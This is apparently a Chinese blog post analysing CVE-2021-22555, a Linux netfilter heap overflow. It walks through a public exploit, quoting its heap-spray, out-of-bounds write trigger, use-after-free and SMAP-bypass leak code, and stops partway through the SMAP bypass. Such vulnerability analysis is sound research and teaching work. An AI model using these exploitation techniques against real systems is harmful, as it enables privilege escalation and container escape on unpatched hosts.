<p>该漏洞在2006年由commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=9fa492cdc160cd27ce1046cb36f47d3b2b1efa21" target="_blank" rel="noopener">9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</a>引入，并在2021年由commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=9fa492cdc160cd27ce1046cb36f47d3b2b1efa21" target="_blank" rel="noopener">b29c457a6511435960115c0f548c4360d5f4801d</a>修复。</p>
<p>利用这个漏洞可以导致目标系统拒绝服务，甚至实现提权、容器逃逸并执行任意代码，危害等级极高。</p>
<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>漏洞位于net/netfilter/x_tables.c的xt_compat_target_from_user函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;tree&#x2F;net&#x2F;netfilter&#x2F;x_tables.c</span><br><span class="line">void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line">				unsigned int *size)</span><br><span class="line">&#123;</span><br><span class="line">	const struct xt_target *target &#x3D; t-&gt;u.kernel.target;</span><br><span class="line">	struct compat_xt_entry_target *ct &#x3D; (struct compat_xt_entry_target *)t;</span><br><span class="line">	int pad, off &#x3D; xt_compat_target_offset(target);</span><br><span class="line">	u_int16_t tsize &#x3D; ct-&gt;u.user.target_size;</span><br><span class="line">	char name[sizeof(t-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">	t &#x3D; *dstptr;</span><br><span class="line">	memcpy(t, ct, sizeof(*ct));</span><br><span class="line">	if (target-&gt;compat_from_user)</span><br><span class="line">		target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line">	else</span><br><span class="line">		memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));</span><br><span class="line">	pad &#x3D; XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	if (pad &gt; 0)</span><br><span class="line">		memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span><br><span class="line"></span><br><span class="line">	tsize +&#x3D; off;</span><br><span class="line">	t-&gt;u.user.target_size &#x3D; tsize;</span><br><span class="line">	strlcpy(name, target-&gt;name, sizeof(name));</span><br><span class="line">	module_put(target-&gt;me);</span><br><span class="line">	strncpy(t-&gt;u.user.name, name, sizeof(t-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">	*size +&#x3D; off;</span><br><span class="line">	*dstptr +&#x3D; tsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>缓冲区溢出发生在memset(t-&gt;data + target-&gt;targetsize, 0, pad)这个语句，其本意是讲已经对齐的缓冲区多余的pad个字节清零。由于在分配内存的时候没有考虑到对齐，t-&gt;data之后只有target-&gt;targetsize个字节的有效存储空间，导致这里会发生pad个字节的溢出。通过选择不同的target，可以控制targetsize，进而控制溢出字节数pad。</p>
<p>要让内核执行到有漏洞的xt_compat_target_from_user函数，需要在用户空间调用setsockopt，并提供IPT_SO_SET_REPLACE或IP6T_SO_SET_REPLACE作为第3个参数。这个操作需要用户进程拥有CAP_NET_ADMIN能力，而这个能力可以通过切换到新的用户+网络名称空间来获得。</p>
<h2 id="三、EXP分析"><a href="#三、EXP分析" class="headerlink" title="三、EXP分析"></a>三、EXP分析</h2><p><a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c" target="_blank" rel="noopener">EXP下载地址</a></p>
<p>EXP整体思路是利用堆溢出改写特殊链表的指针，进而实现UAF，最后改写特定内核结构体的函数指针来实现代码执行。</p>
<h3 id="3-1-实现UAF"><a href="#3-1-实现UAF" class="headerlink" title="3.1 实现UAF"></a>3.1 实现UAF</h3><h4 id="3-1-1-申请消息队列"><a href="#3-1-1-申请消息队列" class="headerlink" title="3.1.1 申请消息队列"></a>3.1.1 申请消息队列</h4><p>通过msgget申请NUM_MSQIDS个消息队列，在EXP中NUM_MSQIDS等于4096。消息队列数目没有特殊要求，数目越多则EXP越稳定，原因后面会解释。这步是为后面的堆喷做准备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  if ((msqid[i] &#x3D; msgget(IPC_PRIVATE, IPC_CREAT | 0666)) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] msgget&quot;);</span><br><span class="line">    goto err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-发送主要消息"><a href="#3-1-2-发送主要消息" class="headerlink" title="3.1.2 发送主要消息"></a>3.1.2 发送主要消息</h4><p>通过msgsnd给每个消息队列都发送一个4096字节的消息，暂且称这些消息为主要消息，每个消息的内容是其所在消息队列的序号，分别为0-4095。注意这里所谓的4096字节并非指消息内容的长度，而是指消息传递到内核空间之后，内核为容纳该消息而开辟的堆缓冲区的大小，该缓冲区容纳了一个结构体msg_msg的实例和消息的实际内容，后面所提及的“消息长度”都是指内核缓冲区的长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying primary messages...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  memset(&amp;msg_primary, 0, sizeof(msg_primary));</span><br><span class="line">  *(int *)&amp;msg_primary.mtext[0] &#x3D; MSG_TAG;</span><br><span class="line">  *(int *)&amp;msg_primary.mtext[4] &#x3D; i;</span><br><span class="line">  if (write_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">      0)</span><br><span class="line">    goto err_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) &#123;</span><br><span class="line">  *(long *)msgp &#x3D; msgtyp;</span><br><span class="line">  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] msgsnd&quot;);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里所使用的msgsnd函数是最常用的堆喷手段之一，因为传递的消息内容会一成不变地复制到内核缓冲区中，这样就可以达到控制内核缓冲区内容的目的。当消息传递到内核空间时，内核是通过alloc_msg函数来申请堆缓冲区的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;tree&#x2F;ipc&#x2F;msgutil.c</span><br><span class="line">static struct msg_msg *alloc_msg(size_t len)</span><br><span class="line">&#123;</span><br><span class="line">	struct msg_msg *msg;</span><br><span class="line">	struct msg_msgseg **pseg;</span><br><span class="line">	size_t alen;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 取实际消息长度len和DATALEN_MSG中的最小值为第一个消息分片的长度</span><br><span class="line">	alen &#x3D; min(len, DATALEN_MSG);</span><br><span class="line">	&#x2F;&#x2F; 为首个消息分片开辟缓冲区，长度为结构体msg_msg加上alen</span><br><span class="line">	msg &#x3D; kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	if (msg &#x3D;&#x3D; NULL)</span><br><span class="line">		return NULL;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next &#x3D; NULL;</span><br><span class="line">	msg-&gt;security &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	len -&#x3D; alen;</span><br><span class="line">	pseg &#x3D; &amp;msg-&gt;next;</span><br><span class="line">	&#x2F;&#x2F; 若首个消息分片不足以容纳完整的消息，将陆续开辟后续的消息分片</span><br><span class="line">	while (len &gt; 0) &#123;</span><br><span class="line">		struct msg_msgseg *seg;</span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen &#x3D; min(len, DATALEN_SEG);</span><br><span class="line">		&#x2F;&#x2F; 为后续消息分片开辟缓冲区，长度为结构体msg_msgseg加上alen</span><br><span class="line">		seg &#x3D; kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		if (seg &#x3D;&#x3D; NULL)</span><br><span class="line">			goto out_err;</span><br><span class="line">		*pseg &#x3D; seg;</span><br><span class="line">		seg-&gt;next &#x3D; NULL;</span><br><span class="line">		pseg &#x3D; &amp;seg-&gt;next;</span><br><span class="line">		len -&#x3D; alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，结构体msg_msg的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct msg_msg &#123;</span><br><span class="line">	struct list_head m_list;</span><br><span class="line">	long m_type;</span><br><span class="line">	size_t m_ts;		&#x2F;* message text size *&#x2F;</span><br><span class="line">	struct msg_msgseg *next;</span><br><span class="line">	void *security;</span><br><span class="line">	&#x2F;* the actual message follows immediately *&#x2F;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct list_head &#123;</span><br><span class="line">    struct list_head *next, *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>内核为消息开辟好缓冲区后，会将其插入到每个消息队列中，形成一个双向链表，每个消息的m_list.next指针指向下一个消息，m_list.prev指向前一个消息。</p>
<p>需要注意的是，当消息实际内容的长度大于阈值DATALEN_MSG时，内核会对消息进行分片，这在利用过程中是必须要避免的，所幸的是这里选择的长度并不会导致消息分片。</p>
<p>发送完后，极大概率存在部分主要消息在地址上是连续的：</p>
<p><img src="/2021/12/27/CVE-2021-22555/1.png" alt></p>
<h4 id="3-1-3-发送次要消息"><a href="#3-1-3-发送次要消息" class="headerlink" title="3.1.3 发送次要消息"></a>3.1.3 发送次要消息</h4><p>再给每个消息队列发送1024个字节的次要消息，每个消息的内容同样是其所在消息队列的序号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying secondary messages...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  memset(&amp;msg_secondary, 0, sizeof(msg_secondary));</span><br><span class="line">  *(int *)&amp;msg_secondary.mtext[0] &#x3D; MSG_TAG;</span><br><span class="line">  *(int *)&amp;msg_secondary.mtext[4] &#x3D; i;</span><br><span class="line">  if (write_msg(msqid[i], &amp;msg_secondary, sizeof(msg_secondary),</span><br><span class="line">                MTYPE_SECONDARY) &lt; 0)</span><br><span class="line">    goto err_rmid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发送完后，每个主要消息后面都会跟着一个次要消息，且它们的内容是相同的：</p>
<p><img src="/2021/12/27/CVE-2021-22555/2.png" alt></p>
<h4 id="3-1-4-释放部分主要消息"><a href="#3-1-4-释放部分主要消息" class="headerlink" title="3.1.4 释放部分主要消息"></a>3.1.4 释放部分主要消息</h4><p>从第1024号队列开始，每隔1024个队列释放一个主要消息，这一步释放的缓冲区将在后面触发漏洞时重新申请使用，将间隔设置为1024也是因为这样选出的主要消息所在的内存位置之后紧邻另一个主要消息的可能性更大。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Creating holes in primary messages...\n&quot;);</span><br><span class="line">for (int i &#x3D; HOLE_STEP; i &lt; NUM_MSQIDS; i +&#x3D; HOLE_STEP) &#123;</span><br><span class="line">  if (read_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">      0)</span><br><span class="line">    goto err_rmid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-5-触发缓冲区溢出漏洞"><a href="#3-1-5-触发缓冲区溢出漏洞" class="headerlink" title="3.1.5 触发缓冲区溢出漏洞"></a>3.1.5 触发缓冲区溢出漏洞</h4><p>重新申请上一步释放的缓冲区，同时触发缓冲区溢出漏洞，将缓冲区外2个字节覆盖为0。前面提到，上一步释放的缓冲区后面极大概率紧跟着一个主要消息，这是因为前面发送了大量主要消息，将内核内存分配器能分配的内存空洞都填满了之后，所获得的缓冲区极大概率是相邻的。所以，申请的消息队列数目越多，发送越多的主要消息，内存空洞被填满的概率越大，EXP也就越稳定。在这种理想情况下，这一步会将缓冲区后面的主要消息的next指针的最低位2个字节覆盖为0，导致其指向另外一个次要消息。这样，就会有2个主要消息的next指针指向同一个次要消息。</p>
<p><img src="/2021/12/27/CVE-2021-22555/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Triggering out-of-bounds write...\n&quot;);</span><br><span class="line">if (trigger_oob_write(s) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">int trigger_oob_write(int s) &#123;</span><br><span class="line">  struct __attribute__((__packed__)) &#123;</span><br><span class="line">    struct ipt_replace replace;</span><br><span class="line">    struct ipt_entry entry;</span><br><span class="line">    struct xt_entry_match match;</span><br><span class="line">    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];</span><br><span class="line">    struct xt_entry_target target;</span><br><span class="line">  &#125; data &#x3D; &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters &#x3D; 1;</span><br><span class="line">  data.replace.num_entries &#x3D; 1;</span><br><span class="line">  data.replace.size &#x3D; (sizeof(data.entry) + sizeof(data.match) +</span><br><span class="line">                       sizeof(data.pad) + sizeof(data.target));</span><br><span class="line"></span><br><span class="line">  data.entry.next_offset &#x3D; (sizeof(data.entry) + sizeof(data.match) +</span><br><span class="line">                            sizeof(data.pad) + sizeof(data.target));</span><br><span class="line">  data.entry.target_offset &#x3D;</span><br><span class="line">      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));</span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size &#x3D; (sizeof(data.match) + sizeof(data.pad));</span><br><span class="line">  strcpy(data.match.u.user.name, &quot;icmp&quot;);</span><br><span class="line">  data.match.u.user.revision &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size &#x3D; sizeof(data.target);</span><br><span class="line">  strcpy(data.target.u.user.name, &quot;NFQUEUE&quot;);</span><br><span class="line">  data.target.u.user.revision &#x3D; 1;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Partially overwrite the adjacent buffer with 2 bytes of zero.</span><br><span class="line">  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, sizeof(data)) !&#x3D; 0) &#123;</span><br><span class="line">    if (errno &#x3D;&#x3D; ENOPROTOOPT) &#123;</span><br><span class="line">      printf(&quot;[-] Error ip_tables module is not loaded.\n&quot;);</span><br><span class="line">      return -1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-6-实现UAF"><a href="#3-1-6-实现UAF" class="headerlink" title="3.1.6 实现UAF"></a>3.1.6 实现UAF</h4><p>利用带MSG_COPY参数的msgrcv函数搜索同一消息队列但内容不同的主要消息和次要消息，这样就可以在不释放消息缓冲区的前提下查看消息内容。前面提到，同一消息队列的主要消息和次要消息的内容在正常情况下应该是相同的，如果不同，说明该主要消息的next指针在上一步被改写了，导致2个消息队列包含同一个次要消息。再释放其中一个队列的次要消息，由于另一个队列还在使用该次要消息，就实现了UAF。</p>
<p><img src="/2021/12/27/CVE-2021-22555/5.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Searching for corrupted primary message...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  if (i !&#x3D; 0 &amp;&amp; (i % HOLE_STEP) &#x3D;&#x3D; 0)</span><br><span class="line">    continue;</span><br><span class="line">  if (peek_msg(msqid[i], &amp;msg_secondary, sizeof(msg_secondary), 1) &lt; 0)</span><br><span class="line">    goto err_no_rmid;</span><br><span class="line">  if (*(int *)&amp;msg_secondary.mtext[0] !&#x3D; MSG_TAG) &#123;</span><br><span class="line">    printf(&quot;[-] Error could not corrupt any primary message.\n&quot;);</span><br><span class="line">    goto err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">  if (*(int *)&amp;msg_secondary.mtext[4] !&#x3D; i) &#123;</span><br><span class="line">    fake_idx &#x3D; i;</span><br><span class="line">    real_idx &#x3D; *(int *)&amp;msg_secondary.mtext[4];</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (fake_idx &#x3D;&#x3D; -1 &amp;&amp; real_idx &#x3D;&#x3D; -1) &#123;</span><br><span class="line">  printf(&quot;[-] Error could not corrupt any primary message.\n&quot;);</span><br><span class="line">  goto err_no_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; fake_idx&#39;s primary message has a corrupted next pointer; wrongly</span><br><span class="line">&#x2F;&#x2F; pointing to real_idx&#39;s secondary message.</span><br><span class="line">printf(&quot;[+] fake_idx: %x\n&quot;, fake_idx);</span><br><span class="line">printf(&quot;[+] real_idx: %x\n&quot;, real_idx);</span><br><span class="line"></span><br><span class="line">printf(&quot;[*] Freeing real secondary message...\n&quot;);</span><br><span class="line">if (read_msg(msqid[real_idx], &amp;msg_secondary, sizeof(msg_secondary),</span><br><span class="line">              MTYPE_SECONDARY) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-绕过SMAP"><a href="#3-2-绕过SMAP" class="headerlink" title="3.2 绕过SMAP"></a>3.2 绕过SMAP</h3><p>如果内核开启了SMAP，用户空间的数据将不能被内核访问，就需要通过信息泄露获取内核空间的地址来利用内核空间的数据。</p>
<h4 id="3-2-1-构造伪次要消息"><a href="#3-2-1-构造伪次要消息" class="headerlink" title="3.2.1 构造伪次要消息"></a>3.2.1 构造伪次要消息</h4><p>上一步释放了一个次要消息所占据的缓冲区，为了方便说明，后面称之为关键缓冲区。关键缓冲区虽然被释放了，但还是有一个消息队列在使用关键缓冲区。</p>
<p>通过write函数向UNIX socket写入数据的方式构造许多个伪次要消息，之所以要构造多个，是为了切实地将虚假数据写入已经被释放的关键缓冲区中。这也是实现堆喷的重要手段，由于没有多余的数据结构占据通过该手段写入的缓冲区，因而可以完全控制内核缓冲区的内容。</p>
<p>这里构造的伪次要消息的m_ts字段（表示消息内容长度的字段）为不需要分片的最大消息内容长度，要远远大于1024字节的真实次要消息内容长度，相当于将相邻的次要消息也纳入伪次要消息的范围。</p>
<p><img src="/2021/12/27/CVE-2021-22555/6.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Reclaim the previously freed secondary message with a fake msg_msg of</span><br><span class="line">&#x2F;&#x2F; maximum possible size.</span><br><span class="line">printf(&quot;[*] Spraying fake secondary messages...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,</span><br><span class="line">              PAGE_SIZE - MSG_MSG_SIZE, 0);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line">  </span><br><span class="line">void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,</span><br><span class="line">                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) &#123;</span><br><span class="line">  msg-&gt;m_list_next &#x3D; m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev &#x3D; m_list_prev;</span><br><span class="line">  msg-&gt;m_type &#x3D; MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts &#x3D; m_ts;</span><br><span class="line">  msg-&gt;next &#x3D; next;</span><br><span class="line">  msg-&gt;security &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) &#123;</span><br><span class="line">  for (int i &#x3D; 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    for (int j &#x3D; 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      if (write(ss[i][0], buf, size) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;[-] write&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-2-越界读取相邻次要消息"><a href="#3-2-2-越界读取相邻次要消息" class="headerlink" title="3.2.2 越界读取相邻次要消息"></a>3.2.2 越界读取相邻次要消息</h4><p>由于构造的伪次要消息的m_ts字段要远大于真实次要消息内容长度，通过读取该消息可以越界读取相邻次要消息的头部内容，包括next指针，这样就获得了该next指针所指向的主要消息的地址（消息队列是双向链表）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Use the fake secondary message to read out-of-bounds.</span><br><span class="line">printf(&quot;[*] Leaking adjacent secondary message...\n&quot;);</span><br><span class="line">if (peek_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), 1) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Check if the leak is valid.</span><br><span class="line">if (*(int *)&amp;msg_fake.mtext[SECONDARY_SIZE] !&#x3D; MSG_TAG) &#123;</span><br><span class="line">  printf(&quot;[-] Error could not leak adjacent secondary message.\n&quot;);</span><br><span class="line">  goto err_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The secondary message contains a pointer to the primary message.</span><br><span class="line">msg &#x3D; (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">kheap_addr &#x3D; msg-&gt;m_list_next;</span><br><span class="line">if (kheap_addr &amp; (PRIMARY_SIZE - 1))</span><br><span class="line">  kheap_addr &#x3D; msg-&gt;m_list_prev;</span><br><span class="line">printf(&quot;[+] kheap_addr: %&quot; PRIx64 &quot;\n&quot;, kheap_addr);</span><br></pre></td></tr></table></figure>

<h4 id="3-2-3-再次构造伪次要消息"><a href="#3-2-3-再次构造伪次要消息" class="headerlink" title="3.2.3 再次构造伪次要消息"></a>3.2.3 再次构造伪次要消息</h4><p>获得了相邻次要消息所指向的主要消息的地址后，通过read函数读取socket内容的方式释放伪次要消息，让关键缓冲区再次进入被释放状态。然后，以相同的方式重新构造伪次要消息，这次构造的m_ts字段要大于消息分片的阈值，next字段等于相邻次要消息所指向的主要消息的地址-结构msg_msgseg的长度，这样做相当于将该主要消息伪造成下一个消息片段，那么在读取伪次要消息时，就可以读取该主要消息的next指针，该指针指向相邻次要消息，将指针内容减去1024即可获得伪次要消息即关键缓冲区的地址。</p>
